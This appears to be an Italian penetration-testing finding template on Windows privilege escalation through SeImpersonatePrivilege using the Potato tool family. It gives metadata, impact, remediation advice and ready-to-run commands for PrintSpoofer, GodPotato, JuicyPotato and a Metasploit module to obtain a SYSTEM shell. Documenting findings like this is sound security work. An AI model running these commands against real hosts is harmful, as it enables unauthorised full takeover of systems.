---
title: "Privilege escalation via SeImpersonatePrivilege (famiglia Potato)"
aliases:
  - "rottenpotato"
  - "rotten potato"
  - "juicypotato"
  - "juicy potato"
  - "potato"
  - "seimpersonateprivilege"
  - "printspoofer"
  - "sweetpotato"
  - "godpotato"
category: "Windows"
cwe: "269"
cvss_vector: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
severity: "high"
mitre:
  - "T1134.001"
  - "T1068"
refs:
  - "https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/"
  - "https://github.com/ohpe/juicy-potato"
  - "https://attack.mitre.org/techniques/T1134/001/"
---

## Descrizione

L'account di servizio con cui è stato ottenuto l'accesso dispone del privilegio SeImpersonatePrivilege (assegnato di default a IIS, SQL Server, Local Service e altri servizi): su sistemi Windows non aggiornati questo privilegio è sfruttabile con le tecniche della famiglia 'Potato' (RottenPotato, Juicy Potato, PrintSpoofer, SweetPotato, GodPotato) per impersonare token SYSTEM.

## Impatto

Un attaccante con accesso limitato (tipicamente come account di servizio dopo una compromissione web) può elevarsi a NT AUTHORITY\SYSTEM, ottenendo il controllo completo dell'host: è una delle vie di privilege escalation più affidabili su Windows non aggiornato.

## Verifica

```
# 1) Verifica: dalla shell sulla vittima controlla i privilegi
whoami /priv
# → se compare SeImpersonatePrivilege (Enabled), il sistema è probabilmente vulnerabile

# 2) Scegli la variante in base alla versione di Windows:
#    - Server 2019 / Win10 recenti: PrintSpoofer (spoolsv) o GodPotato
#    - Server 2016 / Win10 più vecchie: JuicyPotato
#    - sistemi molto vecchi (7/2008): RottenPotato

# 3a) PrintSpoofer (consigliato sui sistemi dove funziona):
PrintSpoofer64.exe -i -c cmd

# 3b) GodPotato (funziona anche su Win11/Server 2022 non patchati):
GodPotato.exe -cmd "cmd /c whoami"

# 3c) JuicyPotato (serve un CLSID valido per l'OS):
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}

# 3d) Da Metasploit:
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION <n>; run
```
Atteso: shell come NT AUTHORITY\SYSTEM.

## Remediation

Mantenere i sistemi aggiornati (le versioni recenti di Windows hanno mitigato la maggior parte delle varianti), ridurre al minimo gli account con SeImpersonatePrivilege, eseguire i servizi con account a privilegi minimi e monitorare la creazione di named pipe e i log di impersonation.
